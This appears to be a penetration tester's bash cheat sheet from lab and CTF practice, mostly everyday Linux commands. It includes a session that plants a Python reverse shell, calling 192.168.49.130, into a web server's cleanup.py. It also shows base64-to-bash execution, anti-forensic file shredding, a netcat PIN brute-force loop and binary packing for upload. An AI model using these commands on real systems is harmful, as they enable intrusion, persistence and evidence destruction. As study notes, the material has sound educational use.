# Commands

## Bash

{% code overflow="wrap" %}
```bash
https://www.gnu.org/software/bash/manual/bash.html
# Loops
https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_09_02.html
https://www.bashoneliners.com/
# Functions
https://tldp.org/LDP/abs/html/localvar.html

# Bash tricks
https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/DEFCON-26-Egypt-One-Liners-to-Rule-Them-All-Updated.pdf
```
{% endcode %}

## General

{% code overflow="wrap" %}
```bash
# SCREENSHOTS ON LINUX
sleep 2; scrot -s test.png

# SYMLINK
ln -s $WANTED_FILE $SYMBOLIC_FILE

history
history | grep ping # for example
netstat -ano
arp -a
route
systemctl enable $SERVICE # start a service on Linux startup
hostname -I # see IPs
cat /etc/group #groups
xclip -sel clip # copy output to clipboard
#FIND ALL FILES (ALSO HIDDEN) RECURSIVELY:
ls -la -R

# WGET
# Get request file and show its content (that way there is no need to download a file and open it later)
wget -q -O- "192.168.0.0/path/file.php"
# download files recursively (directory listing)
wget --no-parent -r ...

# Send commands without syntax problems (Base64)
echo "base64encode" | base64 -d | bash
# Hexadecimal to string
xxd -r -p
# Run a command as another user
sudo -u $USER -- $COMMAND

# Compress a binary to make it smaller and upload it to target:
upx $BINARY
# upx compress binaries + build smaller binaries
go build -ldflags "-s -w" .
upx $BINARY

# MOTD (Moto Of The Day)
cat /etc/update-motd. # folder
# ALIAS
alias # command to see alias
alias shortName="your custom command here"
alias wr=”cd /var/www/html”
~/.bashrc # where command alias are stored 

# Spawn a shell
sh
bash -p # -p as protection measure to acquire the uid of the file owner
$0      # spawn a shell in case there is an uppercase shell for instance

# Execute a command in bash with $()
cd $(pwd)/file
# Apply a command to every argument
find . -type f | xargs cat
# Calculate computing time for a comand
time $COMMAND

# Rev (reverse a string)
echo "dslfjasj" | rev # Reverse the string 
# Tr (translate or delete characters)
Gur confeldjsafk lkjsdkfj # text to rotate
tr '[G-ZA-Fg-za-f]' '[T-ZA-St-za-s]' # rotate 13 positions starting with "G"
abcdefghijklmnopqrstuvwxyz

# MOUNT
mount $IP:/PATH $LOCAL_DESTINATION
sudo mount -t cifs -o port=4455 //192.168.158.10/Data -o username=Administrator,password=lab /mnt/win10_share
# mount SMB share (different port)
mount -t cifs -v -o sec=none,vers=2.0,port=36445 //192.168.169.105/Commander /mnt/Commander
# Check system mounts, external devices
/media

# Use last argument in a command
ls file.sh # List files, in this case only one
nano !$ # Uses the last argument, that's file.sh

# Remove a directory recursively with files
rm -rf folder/
# Remove a file forever and permanently (anti forensics)
scrub -p dod $file; shred -zun 10 -v $file
# Generate a random temp folder
mktemp -d
Move several files or folders to a destination
mv $FILE1 $FOLDER1 $FILE2 $FOLDER2 -t $DESTINATION

# Open a file with default app
xdg-open file
# Filesize
du -hs "folder"
# Rotate a message
tr

# WGET
# Download a folder recursively
wget -r -m -E -np -nd http://192.168.1.199/uploads
# DOWNLOAD A WHOLE FOLDER (r is recursive) 
wget -r
# Speed up wget multiple downloads (Scripting/Commands)
$BASH_COMMANDS_TO_DOWNLOAD_FILES | xargs -n 1 -P 20 wget

# Guess hash identifiers or types
hashid '$HASH'
hash-identifier $hash

# OPEN AN APP SEPARATEDLY FROM THE TERMINAL
app >/dev/null 2>&1
TO MAKE IT NOT TO DIE IF WE CLOSE THE TERMINAL
disown

# Paste/Join two files or wordlists
paste -d: employee-backup-users employee-backup-passwords
```
{% endcode %}

[Piping and redirection](https://ryanstutorials.net/linuxtutorial/piping.php)

{% embed url="https://help.ubuntu.com/community/SSH/OpenSSH/Keys" %}

## Permissions / Special attributes

```bash
# Modify permission on files and groups
chmod o-rw $FILE
chgrp $GROUP $FILE
# Add a group 
groupadd $group
# Assign a file/folder to a group
chgrp $group $file_or_folder
# Add a user to a group
usermod -a -G $group $user

# Advance permissions (i means not even root can delete it)
chattr +i -V $file_or_folder
lsattr $file_or_folder
# We can make a file non writable or non deleted for even the user who created it.
chattr -i -V $FILE # with this flag, the file cannot be edited or removed
lsattr # to list this attribute (not visible with ls)
------------i---------------       file.txt
```

## grep / awk / sed

{% code overflow="wrap" %}
```bash
# REGEX (REGULAR EXPRESSIONS)
https://regex101.com/

# GREP-----------------------
# GREP TEXT BETWEEN TWO CHARACTERS
(?<=firstchar)(.*?)(?=secondchar)
(?<=\[)(.*?)(?=\])
# Examples
└─$ rpcclient -U '' 10.10.10.1 -N -c 'enumdomusers' | grep -oP '(?<=user:\[)(.*?)(?=\])'                                                                               1 ⨯
Administrator
Guest
krbtgt
...
grep -oP '(?<=cn: )(.*?)(?=$)'
# FIND AN EXPRESSION WITHIN A FILE
grep --color=always "$EXPRESSION" $FILE
find . -print0 | xargs -0 grep -i -n "flag12"
# If it says binary matches ---> use --text parameter to grep those###########
# GREP LINES WITH LESS THAN 200 CHARS (AVOID INFINITE LINES THAT MESS UP THE RES)
grep --color=always -Ri crypt /opt/ 2>/dev/null | cut -c1-200 | grep -i crypt
# GREP OF SPECIFIC FILES (CONTAIN CONFIG)\
grep -ri password --include \*config* 2>/dev/null
# FIND A WORD WITH A SPECIFIC NUMBER OF CHARACTERS
grep -E -o '.{5}' $FILE # in this case only grep words with 5 chars
# REGEX AND RECURSION
GREP grep -oiE  
# E for regex / i for insensitive case / o to show only the results not whole lines
grep -iRl "pass" ./ → LOOK RECURSIVELY A TEXT INSIDE FOLDERS
# FIND DIFFERENT LINES IN THE SECOND FILE
grep -Fxv -f file1 file2

# AWK-------------------------
# Find an expression
cat $FILE | awk '/$EXPRESSION/'
# 1st argument
awk'{print($1)}' #--> print just the first part of a string
# 2nd argument
cat /etc/passwd | awk 'NR==2'
# Last argument
echo "Hola         pelo" | awk 'NF{print $NF}'

# SED----------------------------------
# Substitute characters (s/)
sed 's/$WORD/$REPLACEMENT/'  # This will replace only the first match
sed 's/$WORD/$REPLACEMENT/g' # This will replace all matches
sed 's/^root$/noroot/' # Start with root and end with nothing ($)
# TO SCAPE THE SPECIAL CHARACTERS, USE BACKLASH \
sed 's/\*/t/g' test.txt > test2.txt

# Stdin, stdout, stderror
echo $? # Status of the stdout after the last operation, 0 is ok and 1 is error
firefox > /dev/null 2>&1 # redirect everything to stdin to not show data in console
disown # to separate a child process and don't close it with the console
```
{% endcode %}

## Network - net tools

{% hint style="danger" %}
Check **net** command, very useful for Windows targets to achieve specific tasks (net rpc, net share, net user, net password...)
{% endhint %}

## cURL

{% code overflow="wrap" %}
```bash
# Fetch all data from several webpages
for p in $(awk '{print $1}' gobuster-80); do curl -L "192.168.1.199$p"; done

curl $IP # GET request

# POST request with body "flag_please"
curl -X POST -H "Content-Type: text/plain" --data "flag_please" http://10.10.254.99:8081/ctf/post

# GET with cookie result
curl -c - http://10.10.254.99:8081/ctf/getcookie
```
{% endcode %}

## Deploy webserver

```
php -S 0.0.0.0:80
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```

## Differences / regex

```bash
comm file1 file2
comm -12 file1 file2
diff -c scan-a.txt scan-b.txt
diff -u scan-a.txt scan-b.txt
vimdiff scan-a.txt scan-b.txt

https://www.regular-expressions.info/
https://www.rexegg.com/
```

## Find&#x20;

{% tabs %}
{% tab title="Specific string" %}
{% code overflow="wrap" %}
```bash
find / -xdev -type f -print0 2>/dev/null | xargs -0 grep -E '^[a-z0-9]{32}$' 2>/dev/null

# Find recurse case insensitive
find . -iname "*pattern*"

# The "find" command can be used to list files. 
# "-type f" only looking for regular files. 
# "-print0" prints the full file name. 
# "2>/dev/null" discards the errors output. 
# "xargs -0" discards spaces, quotes and backslashes.
# "Grep -E" is for a regex pattern.
# The next part is looking for flags matching 32 characters containing the characters a-z and 0-9.
# This is the format of most of the previous flags, 32 characters
```
{% endcode %}
{% endtab %}

{% tab title="Different searches" %}
```bash
find . -name "*.conf" # find a file using the name

# LIST ALL THE NON EMPTY FILES RECURSIVELY
find . -type f -not -empty -ls
# CAT THEM ALL!!!!
find . -type f -not -empty -exec cat {} \;

# FIND A DATABASE 
find . | grep -i database 

# FIND AND LIST SEVERAL FILES AND FOLDERS ACCORDING TO A SEARCH 
find -name config | xargs ls -l

# FIND FILES FOR A SPECIFIC USER IGNORING ERRORS 
find / -user "user" 2>/dev/null

# FIND IF WE CAN MODIFY FILES IN A FOLDER LIKE www/html 
find . -writable

# FIND A FILE USING THE NAME find . -name "*.conf"
```
{% endtab %}
{% endtabs %}

## lsof

```sh
sudo lsof -i:<port> should show you the process binding to that port
```

## Scripting in Bash

{% tabs %}
{% tab title="Simple concatenation" %}
```bash
$1.$ip  # use the first argument and concatenate it with . and then ip variable
```
{% endtab %}

{% tab title="Read file with counter" %}
```bash
cat /etc/passwd
while read line; do
done 

# BETTER WAY TO DO IT
contador=1
while read line; do
    echo "Línea: $contador $line"
    let contador+=1 # contador = contador + 1
done < /etc/passwd
```
{% endtab %}

{% tab title="Decompress again and again" %}
{% code overflow="wrap" %}
```bash
#!/bin/bash

name_uncompressed=$(7z l content.gzip | grep "Name" -A 2 | tail -n 1 | awk 'NF{print $NF}')

7z l # to list files inside the zip
grep "Name" -A 2 # the uncompressed file is two lines below the name column
tail -n 1 # it's the last line we see in the output text
awk 'NF{print $NF}' # last argument of that line

7z x content.gzip > /dev/null 2>&1 

7z x                  # uncompress the file
> /dev/null 2>&1      # redirect stdout to null and the error to stdout (to not show anything)

while true; do   # infinite loop
    7z l $name_uncompressed > /dev/null 2>&1
    
    if ["$(echo $?)" == "0"]; then
        decompressed_next = $(7z l $name_uncompressed | grep "Name" -A 2 | tail -n 1 | awk 'NF{print $NF}')
        7z x $name_uncompressed > /dev/null 2>&1 && $name_uncompressed=$decompressed_next
        # command after && will be executed if the first had no errors
        # if we use ||, the second only if the first had errors
    else 
       exit 1 # exit the program with error (was not possible to decompress)
    fi
done
```
{% endcode %}
{% endtab %}

{% tab title="Interaction with netcat and bruteforcing" %}
It is possible to send a lot of lines at once. We don't need one by one and wait for the answer.

We create a dictionary with passwords:

```bash
#!/bin/bash # script.sh

for i in {0000..9999}; do
    echo "$PASSWORD $i"
done

# -------
./script.sh > dictionary.txt
```

Now we send all this to Netcat, filtering the fails with grep:

```bash
cat dictionary.txt | nc localhost $PORT | grep -v "Try again"
```
{% endtab %}
{% endtabs %}

## iptables&#x20;

{% code overflow="wrap" %}
```bash
# Check rules
cat /etc/iptables/rules.v4
cat /etc/iptables/rules.v6

### show port as closed
# -A to append rule / INPUT for inbound / -i interface 
sudo iptables (-I $USER) -A INPUT -i $INTERFACE -p tcp --dport 9999 -j REJECT --reject-with tcp-reset
```
{% endcode %}

## Environmental variables

[https://book.hacktricks.xyz/linux-hardening/linux-environment-variables](https://book.hacktricks.xyz/linux-hardening/linux-environment-variables)

[https://www.shell-tips.com/bash/environment-variables/](https://www.shell-tips.com/bash/environment-variables/)

[https://www.hackerone.com/ethical-hacker/how-command-injections](https://www.hackerone.com/ethical-hacker/how-command-injections)

```bash
ECHO $path
# They are stored in /etc/environment
printenv
env

/home/.profile # --> where personal $PATH are stored
```

## Create a file (non-interactive shell)

{% code overflow="wrap" %}
```bash
www-data@target:/$ echo "" > /var/www/html/booked/cleanup.py
echo """" > /var/www/html/booked/cleanup.py
www-data@target:/$  cat <<EOT>> /var/www/html/booked/cleanup.py
 cat <<EOT>> /var/www/html/booked/cleanup.py
> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.130",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
<s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
> EOT
EOT
www-data@target:/$

cat <<EOL > file.txt
...
...
content
...
EOL
```
{% endcode %}

## Vim

<pre class="language-bash"><code class="lang-bash"><strong># GET RID OF LINES WITH A SPECIFIC STRING LIKE "nologin" 
</strong>:g/nologin/d
<strong>
</strong><strong>dd # delete a line
</strong>u  # undo
r  # redo
Shift+d # delete from cursor until the end of the line
d0 # delete from cursor until the beginning of the line
i  # insert mod
Esc(key) # exit insert mod

# Find each ocurrence of 'foo' (in all lines) and replace it with 'bar' 
:%s/foo/bar/g    

# Replace everything that goes before : with nothing to all occurences
:%s/.*://g
</code></pre>

## Terminal

```bash
Ctr+Z --> send to the background 
fg --> foreground 
Ctrl+D --> close terminal 
Ctrl+L --> clear 
Ctrl+K --> erase from the current position until the end of the line 
Ctrl+W --> delete the previous word 
Ctrl+Y --> undo Ctrl+W, Ctrl+K, Ctrl+U 
cd --> go to home directory 
Alt+. --> arguments from last command 
!! --> take last command as argument 
Ctrl+Alt+T --> open new terminal 
Ctrl+Alt+D --> show desktopD
```

## Debug / Decompile

<pre class="language-bash"><code class="lang-bash">gcc file.c -o file
gdb file # GDB TO DEBUG 
<strong>objdump -d file # OBJDUMP TO SEE ASSEMBLY CODE 
</strong></code></pre>

## apache mod security (to secure a website)
